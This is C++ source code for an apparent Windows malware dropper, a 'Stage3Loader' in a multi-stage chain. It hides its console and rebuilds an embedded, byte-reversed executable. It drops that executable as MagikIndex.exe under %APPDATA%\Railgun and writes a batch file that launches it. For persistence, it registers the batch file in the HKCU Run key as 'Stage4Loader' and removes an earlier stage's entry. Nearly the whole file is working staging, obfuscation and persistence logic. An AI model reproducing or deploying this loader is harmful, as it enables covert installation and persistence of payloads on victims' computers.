#define WINDOWS_LEAN_AND_MEAN

#include <iostream>
#include <windows.h>
#include <string>

#include "Example_Image.h"

#define FinalFileName "MagikIndex.exe"

#pragma warning( push )
#pragma warning( disable : 4267 )   //disable DWORD conversion warnings

; BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args);

void main(void) {
    //-------------------------------------------------------start-up

    FreeConsole();

    CreateMutexA(0, FALSE, "Local\\$Stage3Loader$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit(0);
    }


    /*char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));                    //get path to executable
    std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");       //cut the exe's name
    std::string CurrentDir = std::string(PathToFile).substr(0, pos);*/
    char* AppData = nullptr;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
    std::string CurrentDir = AppData;
    CurrentDir += "\\Railgun";
    HKEY hKey = NULL;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
    RegDeleteValueA(hKey,"Stage2Loader");

    //-------------------------------------------------------write final .exe

    int dataSz = sizeof(rawData);                               //size of PE Image buffer
    char* CryptedHex = new char[dataSz];                        //allocate decryption buffer on heap or we might run out of space

    for (int i = 0; i < dataSz; i++) {
        CryptedHex[i] = rawData[dataSz - i - 1];                //reverse the array
    }
    std::string TempFile = "temp";
    TempFile += std::to_string(GetTickCount());                 //create a temp file to write to
    TempFile += ".txt";

    DWORD WrittenBytes;

    std::string DroppedExe = CurrentDir;
    DroppedExe += "\\";
    DroppedExe += FinalFileName;
    std::string MyVBFile;

    HANDLE MyFile = CreateFileA(TempFile.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    WriteFile(MyFile, CryptedHex, dataSz, &WrittenBytes, NULL); //write the raw hex
    MoveFileA(TempFile.c_str(), DroppedExe.c_str());            //rename the file

    delete[] CryptedHex;
    CloseHandle(MyFile);

    //------------------------------------------------------make stage4 script autorun

    std::string PathToBat = CurrentDir;
    PathToBat += "\\RailgunAutorun.bat";

    HANDLE BATFile = CreateFileA("bat4.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(BATFile, "timeout /t 2 >nul", strlen("timeout /t 2 >nul"), &WrittenBytes, NULL);                //1
    WriteFile(BATFile, "start ", strlen("start "), &WrittenBytes, NULL);                                      //2
    WriteFile(BATFile, DroppedExe.c_str(), strlen(DroppedExe.c_str()), &WrittenBytes, NULL);                  //3

    MoveFileA("bat4.txt", PathToBat.c_str());                   //rename the file

    RegisterMyProgramForStartup("Stage4Loader", PathToBat.c_str(), "");

}

BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    char szValue[count] = {};


    strcpy_s(szValue, "\"");
    strcat_s(szValue, pathToExe);
    strcat_s(szValue, "\" ");

    if (args != NULL)
    {
        strcat_s(szValue, args);
    }

    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

#pragma warning ( pop )